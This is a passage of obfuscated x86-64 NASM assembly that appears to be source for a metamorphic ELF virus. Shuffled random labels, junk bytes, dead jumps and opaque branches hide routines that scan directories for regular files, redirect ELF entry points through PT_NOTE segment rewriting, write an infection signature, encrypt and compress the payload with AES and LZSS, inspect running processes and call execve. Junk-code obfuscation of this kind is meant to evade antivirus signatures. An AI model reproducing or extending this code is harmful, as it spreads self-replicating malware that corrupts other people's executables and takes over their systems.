db 0x5e, 0xc2, 0x93
    jmp         $+5
db 0x54, 0x61, 0xce
    jmp         $+5
db 0xbf, 0xc1, 0x3a
    jmp         ..@GgvakrZEQikY
..@YkfHa2IZREXI:
    push        rbx
    je          ..@nS7oIvTdehMU
    jne         ..@nS7oIvTdehMU
..@OsugEdwg6gSR:
    push        rsi
    js          ..@hL4Jws2qhEWt
    jns         ..@hL4Jws2qhEWt
..@PUmp0aEXr5vF:
    mov         QWORD [r2+p_h.p_offset], r3
    jl          ..@4PFoISvWyZCi
    jge         ..@4PFoISvWyZCi
..@Ae23AHfBP80W:
    pop         rdx
    jb          ..@3trSjVcbvTs3
    jae         ..@3trSjVcbvTs3
..@a5w1cL2YSEK4:
    mov         rdx, rdx
    jmp         $+5
db 0x13, 0x07, 0xe1
    je          ..@0ooSt3eIyOiD
    jne         ..@0ooSt3eIyOiD
..@TcyYNqQDOmUF:
    jl          ..@Y9rFEYwCCZHN
    jl          ..@3i9IIoRIvt1j
    jge         ..@3i9IIoRIvt1j
..@2YjK0flw3OkQ:
    xor         r3, r3
    jl          ..@o2tBdzt2NVkd
    jge         ..@o2tBdzt2NVkd
..@qsFlOka70fYD:
    pop         rdx
    js          ..@kPlGaiH0yPSV
    jns         ..@kPlGaiH0yPSV
..@fZnctaitjAT2:
    rep         nop
    jmp         $+3
db 0x92
    jmp         ..@BZywhbUVORZw
..@dgnJdm1Vnwn7:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    js          ..@OEP9Bx1AurjL
    jns         ..@OEP9Bx1AurjL
..@h3gqjYqKhdFS:
    xchg        rsi, rsi
    jmp         $+3
db 0xf9
    jl          ..@s0G49CJzKmQR
    jge         ..@s0G49CJzKmQR
..@N22Us3IkdNA7:
    pop         r3
    jmp         $+4
db 0x0c, 0x4b
    jmp         ..@6eg5pwB6kfoT
..@UD0SkIGBm9Is:
    pop         rbx
    jmp         ..@pvjGCsO36cXV
..@xQKxS9Ynyjb1:
    push        r4
    jmp         $+4
db 0xf0, 0x08
    jmp         $+4
db 0xe2, 0x61
    jl          ..@AQ4Q2XWhcvK3
    jge         ..@AQ4Q2XWhcvK3
..@t4QRsEHomVGc:
    cmp         r1, e_h_size
    jmp         ..@rzcOvnWDrhMF
..@boH7jv70CfZS:
    mov         rax, SYS_GETUID
    jmp         $+4
db 0x1e, 0xeb
    jmp         ..@bHICX05AEb1U
..@qatAuIgbmiZ2:
    call_vsp    Aes256KeyExpansion
    jl          ..@jEf2L27wj4YY
    jge         ..@jEf2L27wj4YY
..@I5uNFvY9FNoH:
    xchg        rdi, rdi
    jmp         $+3
db 0x1b
    jmp         $+5
db 0x31, 0x28, 0xd7
    jmp         $+5
db 0x46, 0x1c, 0x51
    jb          ..@efy1f9ZifXOi
    jae         ..@efy1f9ZifXOi
..@oBaMurGRXnlo:
    cmp         rax, 0
    jmp         $+5
db 0xd3, 0xb8, 0x25
    jmp         $+5
db 0xa4, 0x5c, 0x5f
    jb          ..@dDpmh3hVlu36
    jae         ..@dDpmh3hVlu36
..@5dUvQxmJCXDs:
    pop         rcx
    jmp         $+5
db 0xfb, 0xef, 0x2e
    jb          ..@3PWA2lvbNKWd
    jae         ..@3PWA2lvbNKWd
..@c7IPtlyhZGQi:
%ifdef X86_64
    xor         rdi, rdi
%endif
    jmp         $+4
db 0xf7, 0xf1
    jl          ..@4qO2pJ3MTwBC
    jge         ..@4qO2pJ3MTwBC
..@Xie3JWG5YAp8:
    VAR         packed, execve1
    jmp         $+5
db 0x20, 0x1d, 0xe8
    jmp         ..@IG3n4vzu5VAu
..@jTIXffHtN6y4:
    cmp         ax, LOOKAHEAD_LENGTH
    je          ..@zHkLce9OeOZP
    jne         ..@zHkLce9OeOZP
..@CIc3EmfMg53Y:
    mov         rbx, rbx
    jmp         $+3
db 0x34
    jmp         ..@DgoRFzE2Ey8B
..@SfqqkanHC6q0:
    xchg        rdx, rdx
    jl          ..@ldBEARxuLKmQ
    jge         ..@ldBEARxuLKmQ
..@RS9dYxwyI5PK:
    pop         rdi
    jmp         ..@kpJQkyishEpM
..@KTYMj68w7aK0:
    mov         rbp, rbp
    je          ..@OmhqkY5Glimt
    jne         ..@OmhqkY5Glimt
..@CyZcnCTKC1dY:
    mov         rbx, rbx
    jmp         $+4
db 0xe1, 0x25
    jmp         $+3
db 0xce
    jmp         $+4
db 0xd9, 0x78
    js          ..@gnlZOcHScLRG
    jns         ..@gnlZOcHScLRG
..@lcWZIivLWJxz:
    mov         rsp, rsp
    jmp         ..@BsJoCKJIrS1a
..@lcmXv8KDFvOd:
    ret
    je          WORDToDWORDASCII
    jne         WORDToDWORDASCII
..@aS8Riywjm9np:
    sub         rbx, r3
    jmp         $+4
db 0x04, 0x7a
    jl          ..@b5UhdaVdDZ9S
    jge         ..@b5UhdaVdDZ9S
..@Jy87f4xEzl7A:
    xchg        rdx, rdx
    jmp         ..@R10Lp8gHmASX
..@iExUY32VQb1R:
%ifdef X86_32
    pop         rsi
%endif
    jmp         $+3
db 0x40
    jb          ..@mGmOcIPJwZaC
    jae         ..@mGmOcIPJwZaC
..@nwW2onYDI98v:
    pop         rdi
    jmp         $+3
db 0xb3
    jl          ..@Y9rFEYwCCZHN
    jge         ..@Y9rFEYwCCZHN
..@0Z4kYjfh3zBQ:
    mov         QWORD [r1+e_h.e_entry], r3
    jmp         ..@V5X88xogpykD
..@daSaZR3GGICD:
    push        rax
    jmp         ..@kjAkwFScldeP
..@pSG1Bhxlyzrb:
    sub         rsp, _DYNPIE_OFF_size
    jmp         $+3
db 0xd3
    je          ..@rp1FQQZrdtB8
    jne         ..@rp1FQQZrdtB8
..@fK2njN1pHVl1:
    call        DYNPIEValidation
    jmp         $+5
db 0x22, 0x2d, 0xca
    jl          ..@PjVqEvqrlzSq
    jge         ..@PjVqEvqrlzSq
..@M9SH5uamdSrs:
    mov         r1, rax
    jmp         ..@IM3a3UiKWYC4
..@QujqfTLzN31H:
    push        rsi
    jmp         $+4
db 0x7a, 0xdc
    jmp         ..@6Qdg2SZE0TtR
..@eSdMzZu9JceK:
    cmp         eax, 0x3
    jl          ..@4IEHkxViBsL4
    jge         ..@4IEHkxViBsL4
..@dcVROi2xQpmG:
    xchg        rdi, rdi
    jmp         $+4
db 0x2c, 0xff
    jb          ..@jUfk4Hz7pOPv
    jae         ..@jUfk4Hz7pOPv
..@LWDCIwtJVDSB:
    pop         rax
    js          ..@aQ8XslzevZ5O
    jns         ..@aQ8XslzevZ5O
..@FBqrKO1PaYja:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x10
    jb          ..@fIaYYOyruXyW
    jae         ..@fIaYYOyruXyW
..@69cQLnmVxcxH:
    mov         rbp, rbp
    js          ..@daUgcWtSrIQp
    jns         ..@daUgcWtSrIQp
..@p5NCCOtlP8EG:
    add         rdi, non_packed_len
    jmp         ..@3niGQ87XSE14
..@jCM26cGWN6QU:
    movdqu      xmm1, oWORD [rsp+0x90]
    jmp         $+3
db 0x48
    jb          ..@C7w1Jt332e48
    jae         ..@C7w1Jt332e48
..@7OYvsRl4c3Dd:
    jz          ..@NVPIYw64Bv8S
    jmp         $+4
db 0x8c, 0xa8
    jmp         ..@qFYc0rQE8HEe
..@0KIGmWKlQhjv:
    cmp         rax, 0x00
    jmp         $+5
db 0x04, 0x61, 0xa5
    jl          ..@x2dTYTTyoxV5
    jge         ..@x2dTYTTyoxV5
..@S9mw8k0hBiTB:
    xchg        rdx, rdx
    jmp         ..@Wed4AjHRflwb
..@299kkscFTKln:
    pop         rdx
    jmp         $+3
db 0x61
    jb          ..@uJDd0ZMJuiqO
    jae         ..@uJDd0ZMJuiqO
..@jUfk4Hz7pOPv:
    xor         rax, rax
    jmp         $+5
db 0x5b, 0x51, 0x42
    jb          ..@MtZlgJ1Poe9q
    jae         ..@MtZlgJ1Poe9q
..@dHQaWM7c7Qp6:
    mov         QWORD [r5+file.fileptr], 0x00
    jl          ..@cpiE5iUZNnHU
    jge         ..@cpiE5iUZNnHU
..@DM1T28vVxBfE:
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    jl          ..@FwF5SJLb1jY6
    jge         ..@FwF5SJLb1jY6
..@n1Qbt27odbBP:
    xchg        rsp, rsp
    js          ..@35yQqKStEUGr
    jns         ..@35yQqKStEUGr
..@EQDj8CuvRFdg:
    push        rbx
    jmp         ..@vvchwBGJPcCc
..@clyWkjQvgnBu:
    GGLOBAL     _signature.start
    jmp         ..@sHy24jkYbjm1
..@iA6b8dBEg2MO:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+3
db 0x4c
    jb          ..@RYDVJaj1Vv4f
    jae         ..@RYDVJaj1Vv4f
..@TzSVZYS15Z2e:
    mov         r5, r1
    jmp         $+4
db 0x2e, 0x28
    jl          ..@mchcI4uwwIer
    jge         ..@mchcI4uwwIer
..@KjOXFN8XJnzi:
    pop         rsi
    jmp         ..@OITjpTLr29cP
..@1e7m2LSY8PLD:
    jmp         ..@ZcJZqhnAUXGj
    jmp         $+3
db 0x87
    jb          ..@7wWwkv0URVQ2
    jae         ..@7wWwkv0URVQ2
..@usi54h52eUkU:
    and         eax, 0xff
    jmp         $+3
db 0xfb
    jmp         $+4
db 0xd1, 0x34
    jl          ..@yt3eLuqJsoBW
    jge         ..@yt3eLuqJsoBW
..@9UGAjsRPt6Fa:
    add         r4, rax
    jmp         $+4
db 0x0d, 0x0d
    jmp         $+4
db 0xc4, 0x2b
    jl          ..@c4vJf8mW80YI
    jge         ..@c4vJf8mW80YI
..@7RRgCKaCVt1H:
    xor         rax, rax
    jmp         $+3
db 0x15
    jmp         $+3
db 0xe9
    jb          ..@74DhweE13ffF
    jae         ..@74DhweE13ffF
..@Oz0NXwOgZvU1:
    xchg        rbx, rbx
    jb          ..@R0TCaKWBPapd
    jae         ..@R0TCaKWBPapd
..@sSrJ8mM6NK2j:
    push        rdx
    jmp         $+5
db 0x7b, 0x0b, 0x1c
    jmp         $+5
db 0x2e, 0x28, 0x42
    jmp         $+4
db 0xf8, 0x65
    jl          ..@Ae23AHfBP80W
    jge         ..@Ae23AHfBP80W
..@KuNs1R36MEYm:
    call_vsp    ExitProgram
    js          ..@AbBWZPWr7Az0
    jns         ..@AbBWZPWr7Az0
..@KeMn2RMhxsAg:
    jne         ..@QDG2S62TUpVA
    je          ..@q4A98WAJKwUs
    jne         ..@q4A98WAJKwUs
..@b2UoTtgzu4sp:
    mov         eax, 1
    je          ..@EbEmYzQrvHTj
    jne         ..@EbEmYzQrvHTj
..@7szc3aFRnWUE:
    cmp         BYTE [r5], DT_REG
    jmp         $+4
db 0x7d, 0x39
    js          ..@aWf2JACc4BGC
    jns         ..@aWf2JACc4BGC
..@FlatvSZbtusD:
    mov         rax, rax
    jmp         $+5
db 0x2f, 0x81, 0x1e
    jmp         $+4
db 0x56, 0x53
    je          ..@ZAXOB8LBRRdm
    jne         ..@ZAXOB8LBRRdm
..@xNgmPGQzXxJ1:
    pop         rax
    js          ..@xgeSzBgtCL9c
    jns         ..@xgeSzBgtCL9c
..@7gvVERHMSfv6:
    mov         rcx, rcx
    jmp         ..@NVTvzST75iFs
..@A8Cirdf0x3ad:
    pop         rsi
    jb          ..@t3gtBZqDd2Vk
    jae         ..@t3gtBZqDd2Vk
..@hAGHATkYp0qj:
    xchg        rsp, rsp
    jl          ..@oLeDQ8kpkmQ7
    jge         ..@oLeDQ8kpkmQ7
..@OpaCI8iOaIBE:
    pop         rdx
    jmp         $+3
db 0x02
    jmp         ..@B9ICdJt2wKMl
..@9J2ptGwlqdd7:
    mov         r2, signature_len
    je          ..@sbLMNm7RGG5p
    jne         ..@sbLMNm7RGG5p
..@v5qd0ZUWpIsm:
    pop         rdi
    jmp         ..@hgBalbL1wGVu
..@uCnZAblX6Bq1:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+5
db 0x18, 0x30, 0xca
    jb          ..@wSR4nPXM153W
    jae         ..@wSR4nPXM153W
..@KdwXAI15lCMx:
    push        rbx
    jl          ..@DkSw2oztTRce
    jge         ..@DkSw2oztTRce
..@6G8Y7O3m363O:
    pop         rdi
    je          ..@h3z0KwJ07b53
    jne         ..@h3z0KwJ07b53
..@q8d8UkLEKRV3:
    mov         rsp, rsp
    jmp         ..@4dLT6eA7KG0o
..@JkTWCcCbHxju:
    pop         rax
    jmp         $+4
db 0x6c, 0x1a
    jmp         ..@9XXZoIPhJwHG
..@fobxRCuVZg0x:
    xchg        rsi, rsi
    jmp         $+5
db 0xf0, 0xf0, 0x01
    jmp         $+4
db 0x26, 0xa1
    js          ..@H4tkZRrWud9B
    jns         ..@H4tkZRrWud9B
..@9IjcCumxd4tc:
%ifdef X86_64
    pop         rax
%endif
    jb          ..@l4BYX9El6ZXE
    jae         ..@l4BYX9El6ZXE
..@5swrmqtM7Ot8:
    std
    jmp         $+4
db 0xb9, 0x71
    jmp         $+5
db 0x6e, 0x1f, 0x95
    jmp         ..@bglrDOeLRFAJ
..@AlSZA3Mk1a7x:
    xchg        rdi, rdi
    js          ..@SZ93ZDa3piNK
    jns         ..@SZ93ZDa3piNK
..@EeyaR15A5imy:
    push        rax
    jl          ..@3iqIcUC78QvW
    jge         ..@3iqIcUC78QvW
..@RSHhsJqv03Ts:
    xor         r3, r3
    jmp         $+5
db 0x00, 0x28, 0xa5
    je          ..@gAnju1SJPqHq
    jne         ..@gAnju1SJPqHq
..@hzvcH2lLt9L5:
    mov         rax, rax
    jmp         $+3
db 0x7a
    jmp         ..@KCEAYMJ3g9Bj
..@Xh3gpgpsK66j:
    pop         rdi
    jmp         $+4
db 0xca, 0x37
    jmp         $+4
db 0x6a, 0xfa
    jmp         $+5
db 0xbb, 0xd5, 0x44
    jb          ..@YpEgDwZgFzcD
    jae         ..@YpEgDwZgFzcD
..@eer4RX078fex:
    xchg        rcx, rcx
    jmp         $+3
db 0xc9
    jl          ..@0xyRWqwpjcFD
    jge         ..@0xyRWqwpjcFD
..@UzSPMonivE00:
    push        QWORD 0x0
    jmp         ..@6Ykh0caGybq1
..@diSnKtIg3G2r:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jmp         $+4
db 0x10, 0xe2
    jl          ..@CbHfeKnEHLeT
    jge         ..@CbHfeKnEHLeT
..@7lMakB4DU9fz:
    mov         rax, rax
    jmp         $+4
db 0x53, 0x53
    jmp         $+4
db 0xf7, 0x76
    jmp         ..@xIkJiLkPSdGz
..@q9TS7N4p3FdH:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+5
db 0x4d, 0x42, 0x56
    jb          ..@h3gqjYqKhdFS
    jae         ..@h3gqjYqKhdFS
..@QyE5fFpk1aiX:
    xchg        rcx, rcx
    jl          ..@sZSoHW3NUVpb
    jge         ..@sZSoHW3NUVpb
..@aNhbvN7mwZaD:
    push        rax
    jl          ..@6nhO7DLfa0FV
    jge         ..@6nhO7DLfa0FV
..@J0s2rrTRqUac:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jmp         $+3
db 0x52
    js          ..@gS2fJlsFCBct
    jns         ..@gS2fJlsFCBct
..@XnDGssS4OXwi:
    jle         ..@4P2K30ofBJUH
    jmp         $+4
db 0xbd, 0x0c
    jmp         ..@L5ORRbuMh1DU
..@lG0mAR0Oku2C:
    mov         rdi, rdi
    jl          ..@5xf4XMQEAKMA
    jge         ..@5xf4XMQEAKMA
..@ds7edPevaDKE:
    mov         QWORD [r2+p_h.p_paddr], r3
    jl          ..@ybOTtCkc5sos
    jge         ..@ybOTtCkc5sos
..@i7NU1NGDZYnn:
    jmp         ..@YWaFNXEL47vZ
    jmp         $+5
db 0x6b, 0x9d, 0x2f
    jmp         $+5
db 0xcb, 0x3d, 0x2f
    jl          ..@Oo7w6LLLsMKw
    jge         ..@Oo7w6LLLsMKw
..@2u1nqEeqhq33:
%ifdef X86_32
    push        rbx
%endif
    jmp         $+5
db 0xfe, 0x6f, 0xc3
    jmp         $+3
db 0x6a
    jmp         ..@xgHyUuZzscgR
..@KbUoQPfkIQFl:
    push        rbx
    jmp         $+5
db 0x93, 0xc1, 0x80
    jmp         $+3
db 0xcf
    js          ..@71VzYCnjRVqh
    jns         ..@71VzYCnjRVqh
..@kMcTJrZCXTjf:
    pop         rsi
    jmp         $+4
db 0xfc, 0xb8
    jmp         $+4
db 0x34, 0xfa
    jmp         ..@QCKxRcWaTfO0
..@8iZX7yZ0MG3y:
    pop         rbx
    jmp         $+3
db 0x05
    jmp         ..@6PT9KHo9syZa
..@I1Yo5xWtltLo:
    mov         rcx, r3
    jmp         $+4
db 0xeb, 0x89
    js          ..@TJ4qizaZfCnO
    jns         ..@TJ4qizaZfCnO
..@U9hJn8aUiDKE:
    add         rsp, _UPDATASIG_OFF_size
    jmp         $+4
db 0x70, 0x97
    jmp         $+5
db 0x8d, 0xbb, 0xc3
    jmp         $+3
db 0x9e
    jmp         ..@xEMhOYlsiSCT
..@3S8zJ6i6gUuJ:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    jmp         $+4
db 0xa8, 0xd0
    je          ..@172WAaP5UMvP
    jne         ..@172WAaP5UMvP
..@JkurIbLTuVu8:
    push        rbx
    jb          ..@dzP0V3t9FZMT
    jae         ..@dzP0V3t9FZMT
..@3PWA2lvbNKWd:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jl          ..@pF4uTM3ZxXSO
    jge         ..@pF4uTM3ZxXSO
..@F3UQvoShUztE:
    push        rbx
    jmp         $+3
db 0x83
    jmp         $+3
db 0x91
    jmp         ..@WDdXAOTc1bNF
..@70LlwRRJijRE:
    xchg        rdx, rdx
    jmp         ..@y9p8rji66nss
..@Xuh0odoKhtXa:
    xchg        rdi, rdi
    jl          ..@cckoSjrMvkSn
    jge         ..@cckoSjrMvkSn
..@IXnpAHYPCSo3:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    js          ..@yoJ00vHvTzqW
    jns         ..@yoJ00vHvTzqW
..@Ud7lGl5I3IYm:
    jle         ..@vLasp30cQQ4e
    jmp         ..@F3UQvoShUztE
..@siYLJzMi7Xpz:
    cmp         DWORD [r2+rax], PT_NOTE
    js          ..@y94hVXBqxJDw
    jns         ..@y94hVXBqxJDw
..@He41nECCxgd1:
%ifdef X86_64
    push        rbx
%endif
    jmp         $+4
db 0x23, 0xec
    js          ..@9L2aHK6s4H7V
    jns         ..@9L2aHK6s4H7V
..@dK5NH7iF9hG6:
    xor         rax, rax
    js          ..@Kkhm1ryzn3kD
    jns         ..@Kkhm1ryzn3kD
..@AUZ1wkJmM2jf:
    xchg        rdx, rdx
    jmp         $+3
db 0x8b
    jl          ..@7ZwOk9NE9OK7
    jge         ..@7ZwOk9NE9OK7
..@lAcyGuP7qTpt:
    push        rax
    jmp         $+4
db 0x3e, 0x02
    je          ..@JMJYG258xURZ
    jne         ..@JMJYG258xURZ
..@wgDDcpF7xWGH:
    mov         rdx, rdx
    jmp         $+4
db 0x5e, 0x1d
    jl          ..@rloFCPA73NId
    jge         ..@rloFCPA73NId
..@L5u133eypHqk:
    pop         rax
    jmp         $+5
db 0x1f, 0xa0, 0x40
    jmp         $+5
db 0xeb, 0xc2, 0xe9
    jmp         $+5
db 0x88, 0xb3, 0x16
    je          ..@nEGVxD9XNTD7
    jne         ..@nEGVxD9XNTD7
..@9xSRgi5VxA8a:
    add         r2, e_h.e_shoff
    jb          ..@ONjgPfVYWQR4
    jae         ..@ONjgPfVYWQR4
..@yRLMhJayGRgd:
    add         r4, rax
    jmp         $+5
db 0x81, 0x1a, 0x63
    jmp         $+3
db 0x5e
    jb          ..@J0s2rrTRqUac
    jae         ..@J0s2rrTRqUac
..@FDmduTYqVBJ1:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         ..@ckzPiSSHao1F
..@qaMGrJGwHbhB:
    cmp         al, 0x0
    jmp         $+3
db 0x51
    jb          ..@06Sjqtxo2kur
    jae         ..@06Sjqtxo2kur
..@EThTyQUN9xCO:
    mov         rax, rax
    jl          ..@EyzMpRE1utUr
    jge         ..@EyzMpRE1utUr
..@sZP07JSynCTT:
    sub         r5, 1
    jmp         $+3
db 0xd6
    jmp         ..@nMCth6Sk1k0j
..@2TZ7jo98KTwR:
    xor         rax, rax
    jmp         ..@yNdqNRHTPb8k
..@jTdePBwfMkWg:
    mov         rax, SYS_MUNMAP
    jmp         ..@7V4h4lGj4qHc
..@LIHEDDPLVJ2w:
    mov         rdx, rdx
    jmp         ..@lmrYQSQU6kNu
..@4kGzcPGzOGMw:
    mov         rdi, rdi
    jmp         ..@UjlrJaUOIiNv
..@g3wQpYkUSvDK:
    aesenc      xmm0, xmm1
    jmp         $+5
db 0xbf, 0x23, 0x3b
    jmp         $+5
db 0xaf, 0x7c, 0x31
    jl          ..@4rlqnvWWYEm5
    jge         ..@4rlqnvWWYEm5
..@qSrV3qRaefZg:
    jl          ..@S62Xh7bVPxmn
    jmp         $+3
db 0x45
    je          ..@IjJM1OF0Tmw6
    jne         ..@IjJM1OF0Tmw6
..@W0360JvDv2tt:
    xchg        rcx, rcx
    jmp         $+4
db 0x98, 0x46
    jmp         $+3
db 0xb7
    jmp         $+4
db 0xe5, 0x7f
    jmp         ..@AUZ1wkJmM2jf
..@68n1dD5QfkEr:
    VAR         packed, procs
    jmp         $+5
db 0xbc, 0xc7, 0x1a
    jb          ..@plGLHh3U13fk
    jae         ..@plGLHh3U13fk
..@jWfxW9hczfC2:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jb          ..@FRU0vwEVStYl
    jae         ..@FRU0vwEVStYl
..@BFCQyxv6yHls:
    pop         rsi
    js          ..@lD7TpfoCMIk9
    jns         ..@lD7TpfoCMIk9
..@DmXJg2iSdkKw:
    xchg        rdi, rdi
    js          ..@Osm9CkThL47l
    jns         ..@Osm9CkThL47l
..@tvPJclQJ1yXl:
    jl          ..@6PT9KHo9syZa
    jmp         $+3
db 0xba
    js          ..@lAcyGuP7qTpt
    jns         ..@lAcyGuP7qTpt
..@Yetcpjdk92mw:
    xchg        rsi, rsi
    jmp         $+5
db 0x66, 0x3f, 0x8c
    jb          ..@RJIRNMxcpgRH
    jae         ..@RJIRNMxcpgRH
..@rUmXhatl8NuZ:
    push        rbx
    jmp         $+4
db 0xb4, 0x8e
    js          ..@3wIHiSEpl6Q5
    jns         ..@3wIHiSEpl6Q5
..@ZwKJS9OtDQQu:
    ret
    js          ..@Y1QvwAiRXzke
    jns         ..@Y1QvwAiRXzke
..@QkDckLdWkE40:
    mov         r2, QWORD [r1+file.filename]
    jmp         ..@f4LUaDvFOv0E
..@RzBDntFBGCUr:
    cmp         rax, 0x3
    js          ..@n8H7BSgMPqcQ
    jns         ..@n8H7BSgMPqcQ
..@gC38aGmqMQyi:
    add         r1, non_encrypted_len
    jmp         $+3
db 0x86
    jmp         ..@N5sDWfMMH32S
..@zn1rOgSa0s4N:
    jmp         ..@AXC5oVep9zZ2
    jmp         ..@9Q8ZQKsxxIJb
..@IM3a3UiKWYC4:
    mov         rax, rax
    jmp         $+5
db 0xc9, 0xe3, 0x50
    jl          ..@UzSPMonivE00
    jge         ..@UzSPMonivE00
..@1sNu0NSA6RvY:
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         ..@kcNv3MIFoKlK
..@6MQt6KNItYkD:
    pop         rax
    jmp         $+3
db 0xc9
    jmp         $+5
db 0x3b, 0xc1, 0x7f
    jl          ..@bZLFHuU7GA8g
    jge         ..@bZLFHuU7GA8g
..@vHAadjxreNts:
    cmovl       dx, ax
    jmp         ..@K7njeDmluiIi
..@ggoKC8zl7e6L:
    sub         dl, cl
    jmp         ..@7BMoWqS0TdsZ
..@V4QiyffFRx3x:
    mov         rdx, rdx
    jmp         $+4
db 0xe8, 0xdf
    js          ..@tXhCESow0a4v
    jns         ..@tXhCESow0a4v
..@rzvayCleuzUP:
    pop         rdi
    jmp         $+3
db 0x69
    jmp         $+3
db 0xeb
    jmp         ..@OAtOhMQDbJNr
..@HpOSjS7dkPGz:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jmp         $+3
db 0xb8
    jmp         $+3
db 0x5e
    jmp         ..@9C9O6r2OgQoN
..@deYrIPWfG5Qw:
    mov         QWORD m5, 0x01
    je          ..@PPKB2T1xYwe0
    jne         ..@PPKB2T1xYwe0
..@cmBFSfJPMFSS:
%ifdef X86_64
    pop         rbx
%endif
    jmp         $+4
db 0xaa, 0x90
    je          ..@He41nECCxgd1
    jne         ..@He41nECCxgd1
..@frVdG62Z46Iq:
    pop         rbx
    jmp         $+5
db 0x9c, 0x5a, 0x40
    jl          ..@XXQKY0d5eoEl
    jge         ..@XXQKY0d5eoEl
..@biwdpY2qTEc2:
    pop         rdi
    jmp         $+5
db 0xaa, 0xc3, 0xa6
    je          ..@qatAuIgbmiZ2
    jne         ..@qatAuIgbmiZ2
..@gS2fJlsFCBct:
    jl          ..@9XeejvdJfcgN
    jb          ..@SAsjbWMtVDvK
    jae         ..@SAsjbWMtVDvK
..@PEV8tk6WbZps:
    xchg        rdx, rdx
    jmp         $+3
db 0xa0
    js          ..@jbxiexDquA4f
    jns         ..@jbxiexDquA4f
..@T9Ky4dzzJbRI:
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    js          ..@k79uQHWzb1qd
    jns         ..@k79uQHWzb1qd
..@PlVQ3Tk3RyIX:
%ifdef X86_64
    push        rbx
%endif
    jmp         ..@cmBFSfJPMFSS
..@EA1NVTQZl7fE:
    push        rax
    jl          ..@CW7sMnBi6OEV
    jge         ..@CW7sMnBi6OEV
..@AhlC9k8Msjbn:
    push        rdx
    jmp         $+5
db 0xfd, 0xfb, 0x1f
    jl          ..@ZxqZYoggKRDn
    jge         ..@ZxqZYoggKRDn
..@jP88ddQO3XBM:
    mov         rdi, rdi
    jmp         ..@Tex5JJa9dB6x
..@QHW3sSVuPfQ8:
    push        rax
    jmp         $+4
db 0x36, 0x7e
    jl          ..@8Vwm4ffBhITo
    jge         ..@8Vwm4ffBhITo
..@mAeIY6Kdau4T:
    push        rsi
    jl          ..@5qTE4s00NGrz
    jge         ..@5qTE4s00NGrz
..@nryZItDf9nVD:
    mov         edx, 1
    jmp         $+3
db 0x51
    jb          ..@ExBkDfQLFHyE
    jae         ..@ExBkDfQLFHyE
..@sMMymuIAKF1z:
    aesenc      xmm0, xmm1
    jmp         $+3
db 0xe3
    jmp         $+4
db 0xb0, 0xb0
    jmp         ..@YnSQy5ko6FB9
..@rw5k5qXQHwkY:
    cmp         eax, 0x00
    jmp         $+3
db 0x84
    jb          ..@tvPJclQJ1yXl
    jae         ..@tvPJclQJ1yXl
..@hIYGkmcsF8KT:
    syscall
    jmp         $+5
db 0xf1, 0x32, 0xfb
    jmp         $+3
db 0xe6
    jmp         $+4
db 0xf0, 0xa4
    jmp         ..@rw5k5qXQHwkY
..@ZkU3KUlu5RXz:
    mov         rbx, rbx
    jmp         $+5
db 0x6b, 0x13, 0x4c
    jmp         $+5
db 0x78, 0x8d, 0x16
    jmp         ..@NJBKnzQ3kA01
..@3fgIudWuVEyU:
    xchg        rsi, rsi
    js          ..@B2Fz4Y5y3o1L
    jns         ..@B2Fz4Y5y3o1L
..@7BMoWqS0TdsZ:
    xchg        rdx, rdx
    je          ..@zseWye1cKnuU
    jne         ..@zseWye1cKnuU
..@RXJ3sAvCGguu:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    jmp         $+5
db 0x8d, 0xbc, 0xca
    jmp         ..@rgdmOvUykwjq
..@oI1DlMWJkcQt:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@1toFXbeaajJu
..@xmqoNGUfBkYD:
    push        rdx
    jmp         $+3
db 0x10
    jmp         ..@iy6ucqtXuCwI
..@jee7lj4RvWjr:
    call        MemMove
    jmp         $+4
db 0xb5, 0xde
    jmp         ..@aH5sdodMgQ4r
..@fkGsWPgW0ZU2:
    cmp         QWORD m6, 0x00
    jmp         $+3
db 0xee
    jmp         ..@WFtAGfsUprja
..@BgJe6VnYhsA6:
    mov         rsi, rsi
    jmp         $+4
db 0xd9, 0x19
    jmp         ..@bNo30zGTGv0b
..@DIW0bxfOGqaF:
    mov         rax, rax
    jmp         $+4
db 0x83, 0x7d
    jmp         ..@zljoZ0iBq8fQ
..@Yeb6atPefDZA:
    movdqu      xmm1, oWORD [rsp+0x20]
    jmp         $+5
db 0xa2, 0x26, 0x1d
    je          ..@hdNcVavMwMVZ
    jne         ..@hdNcVavMwMVZ
KeyGen:
    jmp         ..@kfq5uorqZ3Rs
..@7K7WeoPXh3Oq:
    mov         rdi, m6
    jmp         $+4
db 0x9a, 0xc4
    jb          ..@p5NCCOtlP8EG
    jae         ..@p5NCCOtlP8EG
..@0Z0wsrZrl8jm:
    xor         rax, rax
    js          ..@7F3dXYe4qm5T
    jns         ..@7F3dXYe4qm5T
..@KwAKdEFzxzfe:
    xchg        rdi, rdi
    jmp         $+3
db 0x8c
    jmp         ..@8Mofp72ueYHH
..@3Q8CDGgEgd30:
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+3
db 0xb0
    jmp         $+5
db 0xc8, 0x39, 0xfe
    jb          ..@B507lobJntHj
    jae         ..@B507lobJntHj
..@jfiIWTsK98g7:
    movdqu      xmm1, oWORD [rsp+0x40]
    jmp         $+3
db 0xa4
    jmp         $+4
db 0x67, 0xbe
    js          ..@g3wQpYkUSvDK
    jns         ..@g3wQpYkUSvDK
..@ZN2Dqddw4LhO:
    xor         rcx, rcx
    jb          ..@N8ghwH5We6hU
    jae         ..@N8ghwH5We6hU
..@xPc2Y2Rc9LVR:
    pop         rcx
